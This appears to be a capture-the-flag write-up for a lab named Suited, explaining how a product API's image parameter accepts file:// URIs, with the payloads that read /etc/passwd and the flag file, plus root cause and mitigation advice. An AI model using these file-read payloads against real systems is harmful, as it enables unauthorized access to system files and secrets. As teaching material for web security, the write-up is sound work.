---
title: "Arbitrary File Read – image Parameter Leading to file:// Injection | Suited"
date: 2026-05-26 10:30:00 +0530
categories: [A05 - Injection, URI injection]
tags: [arbitrary-file-read, lfi, file-inclusion, file-uri-injection, api-abuse, image-parameter, webversepro]
platform: WebVerse Labs
author: Shivansh Sharma
image:
  path: /assets/images/posts/suited.webp
  alt: Suited & Co product API arbitrary file read via image parameter
---

## Overview

This challenge is based on a partially migrated product platform for a fictional company, Suited & Co. The application exposes a product API where legacy image handling logic was not properly secured during migration.

The issue occurs because the `image` parameter is directly used in file resolution logic without validation, allowing attackers to inject arbitrary file URIs and read sensitive files from the server.

---
## Lab Link

Lab: [Suited](https://dashboard.webverselabs-pro.com/mystery-challenges/suited)

---
## Objective

The goal is to analyze the product API and exploit the image handling functionality to achieve arbitrary file read and retrieve the hidden flag from the server.

---

## Reconnaissance

The application loads product details dynamically using a slug-based endpoint:

```javascript
fetch('/api/products/' + encodeURIComponent(slug))
```

Visiting the product page:

```
https://70062273-4065-suited-619d7.events.webverselabs-pro.com/shop.php#kensington-grey
```

reveals that product images are loaded using:

```html
<img src="/api/products/kensington-grey?image=kensington-grey.jpg" alt="">
```

Key observations:

* `/api/products/<slug>` returns JSON product data
* Adding `?image=` switches the endpoint into image serving mode
* The value of `image` is directly processed by the backend

This suggests potential unsafe file handling.

---

## Exploitation

### Initial testing without proper parameter usage fails:

```
/api/products/kensington-grey?file:///etc/passwd
```

The backend ignores this because the expected parameter name is `image`.

### Correct exploitation requires using:

```
/api/products/kensington-grey?image=file:///etc/passwd
```

This successfully triggers file resolution and returns the contents of `/etc/passwd`.

This confirms an arbitrary file read vulnerability caused by unsafe handling of user input inside a file-loading function.

---

## Reading the Flag

After confirming file access works, the next step is reading the flag file:

```
/api/products/kensington-grey?image=file:///flag.txt
```

The server returns the flag directly, confirming unrestricted file access through the image parameter.

---

## Root Cause

The backend appears to directly pass user input into a file resolver without validation:

```javascript
readFile(req.query.image)
```

or equivalent logic that accepts file URIs.

The system fails to:

* Restrict allowed file paths
* Block unsupported URI schemes like `file://`
* Sanitize user-controlled input before file resolution

---

## Vulnerability Classification

This issue maps to the OWASP Top 10 2025 as:

* **A05 – Injection**
* **Vulnerability Class:** File / URI Injection
* **Subtype:** `file://` scheme injection via user-controlled parameter
* **Specific Issue:** Unvalidated image parameter enabling arbitrary file read (LFI-style access)

---

## Impact

This vulnerability can lead to:

* Arbitrary file read on the server
* Exposure of sensitive configuration files
* Leakage of credentials or API keys
* Access to application source code
* Potential full system compromise depending on environment

Common sensitive targets include:

* `/etc/passwd`
* `/etc/hosts`
* `.env`
* configuration files
* `flag.txt`

---

## Mitigation

To prevent this issue:

* Never pass raw user input into file system operations
* Restrict file access to a fixed directory (allowlist approach)
* Block URI schemes like `file://`, `http://`, `https://`
* Use internal file identifiers instead of direct paths
* Normalize and validate all file paths server-side
* Separate image serving logic from product APIs

---

## Real-World Insight

This issue commonly appears in applications undergoing partial migration, where legacy file handling logic remains active alongside newer API-based systems.

Attackers often exploit these hybrid states by injecting unexpected URI schemes or path formats into file-handling parameters.

---

## Vulnerability Identification Summary

This challenge is primarily:

* **OWASP Top 10 2025:** A05 – Injection
* **Injection Type:** File / URI Injection
* **Mechanism:** User-controlled input passed into file resolver
* **Result:** Arbitrary file read via `file://` scheme